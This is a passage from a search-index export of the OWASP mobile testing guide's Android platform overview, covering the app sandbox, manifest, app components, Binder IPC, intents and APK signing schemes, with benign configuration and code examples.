Android Framework, an abstraction layer that offers high-level Java APIs. The majority of these services are invoked via normal Java method calls and are translated to IPC calls to system services that are running in the background. Examples of system services include:</p> <ul> <li>Connectivity (Wi-Fi, Bluetooth, NFC, etc.)</li> <li>Files</li> <li>Cameras</li> <li>Geolocation (GPS)</li> <li>Microphone</li> </ul> <p>The framework also offers common security functions, such as cryptography.</p> <p>The API specifications change with every new Android release. Critical bug fixes and security patches are usually applied to earlier versions as well.</p> <p>Noteworthy API versions. See  Use Up-to-Date minSdkVersion for more information about security and privacy features introduced in different Android versions.</p> <p>Android development releases follow a unique structure. They are organized into families and given alphabetical codenames inspired by tasty treats. You can find them all here.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#the-app-sandbox","title":"The App Sandbox","text":"<p>Apps are executed in the Android Application Sandbox, which separates the app data and code execution from other apps on the device. As mentioned before, this separation adds a first layer of defense.</p> <p>Installation of a new app creates a new directory named after the app package, which results in the following path: <code>/data/data/[package-name]</code>. This directory holds the app's data. Linux directory permissions are set such that the directory can be read from and written to only with the app's unique UID.</p> <p></p> <p>We can confirm this by looking at the file system permissions in the <code>/data/data</code> folder. For example, we can see that Google Chrome and Calendar are assigned one directory each and run under different user accounts:</p> <pre><code>drwx------  4 u0_a97              u0_a97              4096 2017-01-18 14:27 com.android.calendar\ndrwx------  6 u0_a120             u0_a120             4096 2017-01-19 12:54 com.android.chrome\n</code></pre> <p>Developers who want their apps to share a common sandbox can sidestep sandboxing. When two apps are signed with the same certificate and explicitly share the same user ID (having the sharedUserId in their AndroidManifest.xml files), each can access the other's data directory. See the following example to achieve this in the NFC app:</p> <pre><code>&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n  package=\"com.android.nfc\"\n  android:sharedUserId=\"android.uid.nfc\"&gt;\n</code></pre>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#linux-user-management","title":"Linux User Management","text":"<p>Android leverages Linux user management to isolate apps. This approach is different from user management usage in traditional Linux environments, where multiple apps are often run by the same user. Android creates a unique UID for each Android app and runs the app in a separate process. Consequently, each app can access its own resources only. This protection is enforced by the Linux kernel.</p> <p>Generally, apps are assigned UIDs in the range of 10000 and 99999. Android apps receive a user name based on their UID. For example, the app with UID 10188 receives the user name <code>u0_a188</code>. If the permissions an app requested are granted, the corresponding group ID is added to the app's process. For example, the user ID of the app below is 10188. It belongs to the group ID 3003 (inet). That group is related to android.permission.INTERNET permission. The output of the <code>id</code> command is shown below.</p> <pre><code>$ id\nuid=10188(u0_a188) gid=10188(u0_a188) groups=10188(u0_a188),3003(inet),\n9997(everybody),50188(all_a188) context=u:r:untrusted_app:s0:c512,c768\n</code></pre> <p>The relationship between group IDs and permissions is defined in the following file:</p> <p>platform.xml</p> <pre><code>&lt;permission name=\"android.permission.INTERNET\" &gt;\n    &lt;group gid=\"inet\" /&gt;\n&lt;/permission&gt;\n\n&lt;permission name=\"android.permission.READ_LOGS\" &gt;\n    &lt;group gid=\"log\" /&gt;\n&lt;/permission&gt;\n\n&lt;permission name=\"android.permission.WRITE_MEDIA_STORAGE\" &gt;\n    &lt;group gid=\"media_rw\" /&gt;\n    &lt;group gid=\"sdcard_rw\" /&gt;\n&lt;/permission&gt;\n</code></pre>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#zygote","title":"Zygote","text":"<p>The process <code>Zygote</code> starts up during Android initialization. Zygote is a system service for launching apps. The Zygote process is a \"base\" process that contains all the core libraries the app needs. Upon launch, Zygote opens the socket <code>/dev/socket/zygote</code> and listens for connections from local clients. When it receives a connection, it forks a new process, which then loads and executes the app-specific code.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#app-lifecycle","title":"App Lifecycle","text":"<p>In Android, the lifetime of an app process is controlled by the operating system. A new Linux process is created when an app component is started and the same app doesn't yet have any other components running. Android may kill this process when the latter is no longer necessary or when reclaiming memory is necessary to run more important apps. The decision to kill a process is primarily related to the state of the user's interaction with the process. In general, processes can be in one of four states.</p> <ul> <li>A foreground process (e.g., an activity running at the top of the screen or a running BroadcastReceiver)</li> <li> <p>A visible process is a process that the user is aware of, so killing it would have a noticeable negative impact on user experience. One example is running an activity that's visible to the user on-screen but not in the foreground.</p> </li> <li> <p>A service process is a process hosting a service that has been started with the <code>startService</code> method. Though these processes aren't directly visible to the user, they are generally things that the user cares about (such as background network data upload or download), so the system will always keep such processes running unless there's insufficient memory to retain all foreground and visible processes.</p> </li> <li>A cached process is a process that's not currently needed, so the system is free to kill it when memory is needed. Apps must implement callback methods that react to a number of events; for example, the <code>onCreate</code> handler is called when the app process is first created. Other callback methods include <code>onLowMemory</code>, <code>onTrimMemory</code> and <code>onConfigurationChanged</code>.</li> </ul>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#app-bundles","title":"App Bundles","text":"<p>Android applications can be shipped in two forms: the Android Package Kit (APK) file or an Android App Bundle (.aab). Android App Bundles provide all the resources necessary for an app, but defer the generation of the APK and its signing to Google Play. App Bundles are signed binaries which contain the code of the app in several modules. The base module contains the core of the application. The base module can be extended with various modules which contain new enrichments/functionalities for the app as further explained on the developer documentation for app bundle. If you have an Android App Bundle, you can best use the bundletool command line tool from Google to build unsigned APKs in order to use the existing tooling on the APK. You can create an APK from an AAB file by running the following command:</p> <pre><code>bundletool build-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks\n</code></pre> <p>If you want to create signed APKs ready for deployment to a test device, use:</p> <pre><code>$ bundletool build-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks\n--ks=/MyApp/keystore.jks\n--ks-pass=file:/MyApp/keystore.pwd\n--ks-key-alias=MyKeyAlias\n--key-pass=file:/MyApp/key.pwd\n</code></pre> <p>We recommend that you test both the APK with and without the additional modules, so that it becomes clear whether the additional modules introduce and/or fix security issues for the base module.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#android-manifest","title":"Android Manifest","text":"<p>Every Android app contains an <code>AndroidManifest.xml</code> file in the root of the APK, stored in binary XML format. This file defines the app's structure and key properties used by the Android operating system during installation and runtime.</p> <p>Security-relevant elements include:</p> <ul> <li>Permissions: Declares required permissions using <code>&lt;uses-permission&gt;</code> such as access to the internet, camera, storage, location, or contacts. These define the app's access boundaries and should follow the principle of least privilege. Custom permissions can be defined using <code>&lt;permission&gt;</code> and should include a proper <code>protectionLevel</code> such as <code>signature</code> or <code>dangerous</code> to avoid being misused by other apps.</li> <li>Components: The manifest lists all app components declared in the app serving as entry points. They can be exposed to other apps (via intent filters or the <code>exported</code> attribute) so they are critical to determine how an attacker might interact with the app. The main component types are:<ul> <li>Activities: define user interface screens.</li> <li>Services: run background tasks.</li> <li>Broadcast Receivers: handle external messages.</li> <li>Content Providers: expose structured data.</li> </ul> </li> <li>Deep Links: Deep links are configured via intent filters with the <code>VIEW</code> action, <code>BROWSABLE</code> category, and a <code>data</code> element specifying a URI pattern. These can expose activities to web or app links and must be verified carefully to avoid injection or spoofing risks. Adding <code>android:autoVerify=\"true\"</code> enables App Links, which restrict handling of verified links to the declared app, reducing the risk of link hijacking.</li> <li>Uses Cleartext Traffic: The <code>android:usesCleartextTraffic</code> attribute controls whether the app allows non-encrypted HTTP traffic. From Android 9 (API 28) onward, cleartext traffic is disabled by default unless explicitly allowed. This attribute can also be overridden by the <code>networkSecurityConfig</code>.</li> <li>Network Security Config: An optional XML file defined via <code>android:networkSecurityConfig</code>, available since Android 7.0 (API level 24), that provides granular control over network security behavior. It allows specifying trusted certificate authorities, per-domain TLS requirements, and cleartext traffic exceptions, overriding global settings defined in <code>android:usesCleartextTraffic</code>.</li> <li>Backup Behavior: The <code>android:allowBackup</code> attribute allows or prevents app data from being backed up.</li> <li>Task Affinities and Launch Modes: These settings influence how activities are grouped and launched. Misconfigurations can allow task hijacking or phishing-style attacks if an attacker's app mimics legitimate components.</li> </ul> <p>The full list of available manifest options can be found in the official Android Manifest file documentation.</p> <p>At build time, the manifest is merged with those from all included libraries and dependencies. The final merged manifest may include additional permissions, components, or settings not explicitly declared by the developer. Security reviews must analyze the merged output to understand the app's real exposure.</p> <p>Here is an example of a manifest file as defined by a developer. It declares several permissions, allows backup, and defines the app's main activity:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_CONTACTS\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n    &lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <p>If you were to obtain the AndroidManifest.xml file from an APK ( Obtaining Information from the AndroidManifest), you would see that it includes additional elements such as the <code>package</code> attribute, which defines the app's unique identifier, the <code>&lt;uses-sdk&gt;</code> element that specifies the <code>android:minSdkVersion</code> and <code>android:targetSdkVersion</code>, new activities, providers and receivers and other attributes such as <code>android:debuggable=\"true\"</code> which indicates that the app is in debug mode.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:versionCode=\"1\" android:versionName=\"1.0\"\n    android:compileSdkVersion=\"35\"\n    android:compileSdkVersionCodename=\"15\"\n    package=\"org.owasp.mastestapp\"\n    platformBuildVersionCode=\"35\"\n    platformBuildVersionName=\"15\"&gt;\n    &lt;uses-sdk\n        android:minSdkVersion=\"29\"\n        android:targetSdkVersion=\"35\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_CONTACTS\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/&gt;\n    &lt;permission\n        android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\"\n        android:protectionLevel=\"signature\"/&gt;\n    &lt;uses-permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\"/&gt;\n    &lt;application\n        android:theme=\"@style/Theme.MASTestApp\"\n        android:label=\"@string/app_name\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:debuggable=\"true\"\n        android:testOnly=\"true\"\n        android:allowBackup=\"true\"\n        android:supportsRtl=\"true\"\n        android:extractNativeLibs=\"false\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"&gt;\n        &lt;activity\n            android:theme=\"@style/Theme.MASTestApp\"\n            android:name=\"org.owasp.mastestapp.MainActivity\"\n            android:exported=\"true\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n        &lt;activity\n            android:name=\"androidx.compose.ui.tooling.PreviewActivity\"\n            android:exported=\"true\"/&gt;\n        &lt;activity\n            android:name=\"androidx.activity.ComponentActivity\"\n            android:exported=\"true\"/&gt;\n        &lt;provider\n            android:name=\"androidx.startup.InitializationProvider\"\n            android:exported=\"false\"\n            android:authorities=\"org.owasp.mastestapp.androidx-startup\"&gt;\n            &lt;meta-data\n                android:name=\"androidx.emoji2.text.EmojiCompatInitializer\"\n                android:value=\"androidx.startup\"/&gt;\n            ...\n        &lt;/provider&gt;\n        &lt;receiver\n            android:name=\"androidx.profileinstaller.ProfileInstallReceiver\"\n            android:permission=\"android.permission.DUMP\"\n            android:enabled=\"true\"\n            android:exported=\"true\"\n            android:directBootAware=\"false\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.INSTALL_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            ...\n        &lt;/receiver&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#app-components","title":"App Components","text":"<p>Android apps are made of several high-level components. The main components are:</p> <ul> <li>Activities</li> <li>Fragments</li> <li>Intents</li> <li>Broadcast receivers</li> <li>Content providers and services</li> </ul> <p>All these elements are provided by the Android operating system, in the form of predefined classes available through APIs.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#activities","title":"Activities","text":"<p>Activities make up the visible part of any app. There is one activity per screen, so an app with three different screens implements three different activities. Activities are declared by extending the Activity class. They contain all user interface elements: fragments, views, and layouts.</p> <p>Each activity needs to be declared in the Android Manifest with the following syntax:</p> <pre><code>&lt;activity android:name=\"ActivityName\"&gt;\n&lt;/activity&gt;\n</code></pre> <p>Activities not declared in the manifest can't be displayed, and attempting to launch them will raise an exception.</p> <p>Like apps, activities have their own life cycle and need to monitor system changes to handle them. Activities can be in the following states: active, paused, stopped, and inactive. These states are managed by the Android operating system. Accordingly, activities can implement the following event managers:</p> <ul> <li>onCreate</li> <li>onSaveInstanceState</li> <li>onStart</li> <li>onResume</li> <li>onRestoreInstanceState</li> <li>onPause</li> <li>onStop</li> <li>onRestart</li> <li>onDestroy</li> </ul> <p>An app may not explicitly implement all event managers, in which case default actions are taken. Typically, at least the <code>onCreate</code> manager is overridden by the app developers. This is how most user interface components are declared and initialized. <code>onDestroy</code> may be overridden when resources (like network connections or connections to databases) must be explicitly released or specific actions must occur when the app shuts down.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#fragments","title":"Fragments","text":"<p>A fragment represents a behavior or a portion of the user interface within the activity. Fragments were introduced Android with the version Honeycomb 3.0 (API level 11).</p> <p>Fragments are meant to encapsulate parts of the interface to facilitate re-usability and adaptation to different screen sizes. Fragments are autonomous entities in that they include all their required components (they have their own layout, buttons, etc.). However, they must be integrated with activities to be useful: fragments can't exist on their own. They have their own life cycle, which is tied to the life cycle of the Activities that implement them.</p> <p>Because fragments have their own life cycle, the Fragment class contains event managers that can be redefined and extended. These event managers included onAttach, onCreate, onStart, onDestroy and onDetach. Several others exist; the reader should refer to the Android Fragment specification for more details.</p> <p>Fragments can be easily implemented by extending the Fragment class provided by Android:</p> <p>Example in Java:</p> <pre><code>public class MyFragment extends Fragment {\n    ...\n}\n</code></pre> <p>Example in Kotlin:</p> <pre><code>class MyFragment : Fragment() {\n    ...\n}\n</code></pre> <p>Fragments don't need to be declared in manifest files because they depend on activities.</p> <p>To manage its fragments, an activity can use a Fragment Manager (FragmentManager class). This class makes it easy to find, add, remove, and replace associated fragments.</p> <p>Fragment Managers can be created via the following:</p> <p>Example in Java:</p> <pre><code>FragmentManager fm = getFragmentManager();\n</code></pre> <p>Example in Kotlin:</p> <pre><code>var fm = fragmentManager\n</code></pre> <p>Fragments don't necessarily have a user interface; they can be a convenient and efficient way to manage background operations pertaining to the app's user interface. A fragment may be declared persistent so that if the system preserves its state even if its Activity is destroyed.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#content-providers","title":"Content Providers","text":"<p>Android uses SQLite to store data permanently: as with Linux, data is stored in files. SQLite is a light, efficient, open source relational data storage technology that does not require much processing power, which makes it ideal for mobile use. An entire API with specific classes (Cursor, ContentValues, SQLiteOpenHelper, ContentProvider, ContentResolver, etc.) is available. SQLite is not run as a separate process; it is part of the app. By default, a database belonging to a given app is accessible to this app only. However, content providers offer a great mechanism for abstracting data sources (including databases and flat files); they also provide a standard and efficient mechanism to share data between apps, including native apps. To be accessible to other apps, a content provider needs to be explicitly declared in the manifest file of the app that will share it. As long as content providers aren't declared, they won't be exported and can only be called by the app that creates them.</p> <p>Content providers are implemented through a URI addressing scheme: they all use the content:// model. Regardless of the type of sources (SQLite database, flat file, etc.), the addressing scheme is always the same, thereby abstracting the sources and offering the developer a unique scheme. Content providers offer all regular database operations: create, read, update, delete. That means that any app with proper rights in its manifest file can manipulate the data from other apps.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#services","title":"Services","text":"<p>Services are Android OS components (based on the Service class) that perform tasks in the background (data processing, starting intents, and notifications, etc.) without presenting a user interface. Services are meant to run processes long-term. Their system priorities are lower than those of active apps and higher than those of inactive apps. Therefore, they are less likely to be killed when the system needs resources, and they can be configured to automatically restart when enough resources become available. This makes services a great candidate for running background tasks. Please note that Services, like Activities, are executed in the main app thread. A service does not create its own thread and does not run in a separate process unless you specify otherwise.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#inter-process-communication","title":"Inter-Process Communication","text":"<p>As we've already learned, every Android process has its own sandboxed address space. Inter-process communication facilities allow apps to exchange signals and data securely. Instead of relying on the default Linux IPC facilities, Android's IPC is based on Binder, a custom implementation of OpenBinder. Most Android system services and all high-level IPC services depend on Binder.</p> <p>The term Binder stands for a lot of different things, including:</p> <ul> <li>Binder Driver: the kernel-level driver</li> <li>Binder Protocol: low-level ioctl-based protocol used to communicate with the binder driver</li> <li>IBinder Interface: a well-defined behavior that Binder objects implement</li> <li>Binder object: generic implementation of the IBinder interface</li> <li>Binder service: implementation of the Binder object; for example, location service, and sensor service</li> <li>Binder client: an object using the Binder service</li> </ul> <p>The Binder framework includes a client-server communication model. To use IPC, apps call IPC methods in proxy objects. The proxy objects transparently marshall the call parameters into a parcel and send a transaction to the Binder server, which is implemented as a character driver (/dev/binder). The server holds a thread pool for handling incoming requests and delivers messages to the destination object. From the perspective of the client app, all of this seems like a regular method call, all the heavy lifting is done by the Binder framework.</p> <p></p> <ul> <li>Binder Overview - Image source: Android Binder by Thorsten Schreiber</li> </ul> <p>Services that allow other applications to bind to them are called bound services. These services must provide an IBinder interface to clients. Developers use the Android Interface Descriptor Language (AIDL) to write interfaces for remote services.</p> <p>ServiceManager is a system daemon that manages the registration and lookup of system services. It maintains a list of name/Binder pairs for all registered services. Services are added with <code>addService</code> and retrieved by name with the static <code>getService</code> method in <code>android.os.ServiceManager</code>:</p> <p>Example in Java:</p> <pre><code>public static IBinder getService(String name) {\n        try {\n            IBinder service = sCache.get(name);\n            if (service != null) {\n                return service;\n            } else {\n                return getIServiceManager().getService(name);\n            }\n        } catch (RemoteException e) {\n            Log.e(TAG, \"error in getService\", e);\n        }\n        return null;\n    }\n</code></pre> <p>Example in Kotlin:</p> <pre><code>companion object {\n        private val sCache: Map&lt;String, IBinder&gt; = ArrayMap()\n        fun getService(name: String): IBinder? {\n            try {\n                val service = sCache[name]\n                return service ?: getIServiceManager().getService(name)\n            } catch (e: RemoteException) {\n                Log.e(FragmentActivity.TAG, \"error in getService\", e)\n            }\n            return null\n        }\n    }\n</code></pre> <p>You can query the list of system services with the <code>service list</code> command.</p> <pre><code>$ adb shell service list\nFound 99 services:\n0 carrier_config: [com.android.internal.telephony.ICarrierConfigLoader]\n1 phone: [com.android.internal.telephony.ITelephony]\n2 isms: [com.android.internal.telephony.ISms]\n3 iphonesubinfo: [com.android.internal.telephony.IPhoneSubInfo]\n</code></pre>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#intents","title":"Intents","text":"<p>Intent messaging is an asynchronous communication framework built on top of Binder. This framework allows both point-to-point and publish-subscribe messaging. An Intent is a messaging object that can be used to request an action from another app component. Although intents facilitate inter-component communication in several ways, there are three fundamental use cases:</p> <ul> <li>Starting an activity<ul> <li>An activity represents a single screen in an app. You can start a new instance of an activity by passing an intent to <code>startActivity</code>. The intent describes the activity and carries necessary data.</li> </ul> </li> <li>Starting a service<ul> <li>A Service is a component that performs operations in the background, without a user interface. With Android 5.0 (API level 21) and later, you can start a service with JobScheduler.</li> </ul> </li> <li>Delivering a broadcast<ul> <li>A broadcast is a message that any app can receive. The system delivers broadcasts for system events, including system boot and charging initialization. You can deliver a broadcast to other apps by passing an intent to <code>sendBroadcast</code> or <code>sendOrderedBroadcast</code>.</li> </ul> </li> </ul> <p>There are two types of intents. Explicit intents name the component that will be started (the fully qualified class name). For instance:</p> <p>Example in Java:</p> <pre><code>Intent intent = new Intent(this, myActivity.myClass);\n</code></pre> <p>Example in Kotlin:</p> <pre><code>var intent = Intent(this, myActivity.myClass)\n</code></pre> <p>Implicit intents are sent to the OS to perform a given action on a given set of data (The URL of the OWASP website in our example below). It is up to the system to decide which app or class will perform the corresponding service. For instance:</p> <p>Example in Java:</p> <pre><code>Intent intent = new Intent(Intent.MY_ACTION, Uri.parse(\"https://www.owasp.org\"));\n</code></pre> <p>Example in Kotlin:</p> <pre><code>var intent = Intent(Intent.MY_ACTION, Uri.parse(\"https://www.owasp.org\"))\n</code></pre> <p>An intent filter is an expression in Android Manifest files that specifies the type of intents the component would like to receive. For instance, by declaring an intent filter for an activity, you make it possible for other apps to directly start your activity with a certain kind of intent. Likewise, your activity can only be started with an explicit intent if you don't declare any intent filters for it.</p> <p>Android uses intents to broadcast messages to apps (such as an incoming call or SMS) important power supply information (low battery, for example), and network changes (loss of connection, for instance). Extra data may be added to intents (through <code>putExtra</code>/<code>getExtras</code>).</p> <p>Here is a short list of intents sent by the operating system. All constants are defined in the Intent class, and the whole list is in the official Android documentation:</p> <ul> <li>ACTION_CAMERA_BUTTON</li> <li>ACTION_MEDIA_EJECT</li> <li>ACTION_NEW_OUTGOING_CALL</li> <li>ACTION_TIMEZONE_CHANGED</li> </ul> <p>To improve security and privacy, a Local Broadcast Manager is used to send and receive intents within an app without having them sent to the rest of the operating system. This is very useful for ensuring that sensitive and private data don't leave the app perimeter (geolocation data for instance).</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#broadcast-receivers","title":"Broadcast Receivers","text":"<p>Broadcast Receivers are components that allow apps to receive notifications from other apps and from the system itself. With them, apps can react to events (internal, initiated by other apps, or initiated by the operating system). They are generally used to update user interfaces, start services, update content, and create user notifications.</p> <p>There are two ways to make a Broadcast Receiver known to the system. One way is to declare it in the Android Manifest file. The manifest should specify an association between the Broadcast Receiver and an intent filter to indicate the actions the receiver is meant to listen for.</p> <p>An example Broadcast Receiver declaration with an intent filter in a manifest:</p> <pre><code>&lt;receiver android:name=\".MyReceiver\" &gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"com.owasp.myapplication.MY_ACTION\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>Please note that in this example, the Broadcast Receiver does not include the <code>android:exported</code> attribute. As at least one filter was defined, the default value will be set to \"true\". In absence of any filters, it will be set to \"false\".</p> <p>The other way is to create the receiver dynamically in code. The receiver can then register with the method <code>Context.registerReceiver</code>.</p> <p>An example of registering a Broadcast Receiver dynamically:</p> <p>Example in Java:</p> <pre><code>// Define a broadcast receiver\nBroadcastReceiver myReceiver = new BroadcastReceiver() {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        Log.d(TAG, \"Intent received by myReceiver\");\n    }\n};\n// Define an intent filter with actions that the broadcast receiver listens for\nIntentFilter intentFilter = new IntentFilter();\nintentFilter.addAction(\"com.owasp.myapplication.MY_ACTION\");\n// To register the broadcast receiver\nregisterReceiver(myReceiver, intentFilter);\n// To un-register the broadcast receiver\nunregisterReceiver(myReceiver);\n</code></pre> <p>Example in Kotlin:</p> <pre><code>// Define a broadcast receiver\nval myReceiver: BroadcastReceiver = object : BroadcastReceiver() {\n    override fun onReceive(context: Context, intent: Intent) {\n        Log.d(FragmentActivity.TAG, \"Intent received by myReceiver\")\n    }\n}\n// Define an intent filter with actions that the broadcast receiver listens for\nval intentFilter = IntentFilter()\nintentFilter.addAction(\"com.owasp.myapplication.MY_ACTION\")\n// To register the broadcast receiver\nregisterReceiver(myReceiver, intentFilter)\n// To un-register the broadcast receiver\nunregisterReceiver(myReceiver)\n</code></pre> <p>Note that the system starts an app with the registered receiver automatically when a relevant intent is raised.</p> <p>According to Broadcasts Overview, a broadcast is considered \"implicit\" if it does not target an app specifically. After receiving an implicit broadcast, Android will list all apps that have registered a given action in their filters. If more than one app has registered for the same action, Android will prompt the user to select from the list of available apps.</p> <p>An interesting feature of Broadcast Receivers is that they can be prioritized; this way, an intent will be delivered to all authorized receivers according to their priority. A priority can be assigned to an intent filter in the manifest via the <code>android:priority</code> attribute as well as programmatically via the <code>IntentFilter.setPriority</code> method. However, note that receivers with the same priority will be run in an arbitrary order.</p> <p>If your app is not supposed to send broadcasts across apps, use a Local Broadcast Manager (<code>LocalBroadcastManager</code>). They can be used to make sure intents are received from the internal app only, and any intent from any other app will be discarded. This is very useful for improving security and the efficiency of the app, as no interprocess communication is involved. However, please note that the <code>LocalBroadcastManager</code> class is deprecated and Google recommends using alternatives such as <code>LiveData</code>.</p> <p>For more security considerations regarding Broadcast Receiver, see Security Considerations and Best Practices.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#implicit-broadcast-receiver-limitation","title":"Implicit Broadcast Receiver Limitation","text":"<p>According to Background Optimizations, apps targeting Android 7.0 (API level 24) or higher no longer receive <code>CONNECTIVITY_ACTION</code> broadcast unless they register their Broadcast Receivers with <code>Context.registerReceiver()</code>. The system does not send <code>ACTION_NEW_PICTURE</code> and <code>ACTION_NEW_VIDEO</code> broadcasts as well.</p> <p>According to Background Execution Limits, apps that target Android 8.0 (API level 26) or higher can no longer register Broadcast Receivers for implicit broadcasts in their manifest, except for those listed in Implicit Broadcast Exceptions. The Broadcast Receivers created at runtime by calling <code>Context.registerReceiver</code> are not affected by this limitation.</p> <p>According to Changes to System Broadcasts, beginning with Android 9 (API level 28), the <code>NETWORK_STATE_CHANGED_ACTION</code> broadcast doesn't receive information about the user's location or personally identifiable data.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#android-application-publishing","title":"Android Application Publishing","text":"<p>Once an app has been successfully developed, the next step is to publish and share it with others. However, apps can't simply be added to a store and shared, they must be first signed. The cryptographic signature serves as a verifiable mark placed by the developer of the app. It identifies the app's author and ensures that the app has not been modified since its initial distribution.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#signing-process","title":"Signing Process","text":"<p>During development, apps are signed with an automatically generated certificate. This certificate is inherently insecure and is for debugging only. Most stores don't accept this kind of certificate for publishing; therefore, a certificate with more secure features must be created. When an application is installed on the Android device, the Package Manager ensures that it has been signed with the certificate included in the corresponding APK. If the certificate's public key matches the key used to sign any other APK on the device, the new APK may share a UID with the pre-existing APK. This facilitates interactions between applications from a single vendor. Alternatively, specifying security permissions for the Signature protection level is possible; this will restrict access to applications that have been signed with the same key.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#apk-signing-schemes","title":"APK Signing Schemes","text":"<p>Android supports multiple application signing schemes:</p> <ul> <li>Below Android 7.0 (API level 24): applications can only use the JAR signing (v1) scheme which does not protect all parts of the APK. This scheme is considered insecure.</li> <li>Android 7.0 (API level 24) and above: applications can use the v2 signature scheme, which signs the APK as a whole, providing stronger protection compared to the older v1 (JAR) signing method.</li> <li>Android 9 (API level 28) and above: It's recommended to use both the v2 and v3 signature schemes. The v3 scheme supports key rotation, enabling developers to replace keys in the event of a compromise without invalidating old signatures.</li> <li>Android 11 (API level 30) and above: applications can optionally include the v4 signature scheme to enable faster incremental updates.</li> </ul> <p>For backwards compatibility, an APK can be signed with multiple signature schemes in order to make the app run on both newer and older SDK versions. For example, older platforms ignore v2 signatures and verify v1 signatures only.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#jar-signing-v1-scheme","title":"JAR Signing (v1 Scheme)","text":"<p>The original version of app signing implements the signed APK as a standard signed JAR, which must contain all the entries in <code>META-INF/MANIFEST.MF</code>. All files must be signed with a common certificate. This scheme does not protect some parts of the APK, such as ZIP metadata. The drawback of this scheme is that the APK verifier needs to process untrusted data structures before applying the signature, and the verifier discards data the data structures don't cover. Also, the APK verifier must decompress all compressed files, which takes considerable time and memory.</p> <p>This signature scheme is considered insecure, it is for example affected by the Janus vulnerability (CVE-2017-13156), which can allow malicious actors to modify APK files without invalidating the v1 signature. As such, v1 should never be relied on for devices running Android 7.0 and above.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#apk-signature-scheme-v2-scheme","title":"APK Signature Scheme (v2 Scheme)","text":"<p>With the APK signature scheme, the complete APK is hashed and signed, and an APK Signing Block is created and inserted into the APK. During validation, the v2 scheme checks the signatures of the entire APK file. This form of APK verification is faster and offers more comprehensive protection against modification. You can see the APK signature verification process for v2 Scheme below.</p> <p></p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#apk-signature-scheme-v3-scheme","title":"APK Signature Scheme (v3 Scheme)","text":"<p>The v3 APK Signing Block format is the same as v2. V3 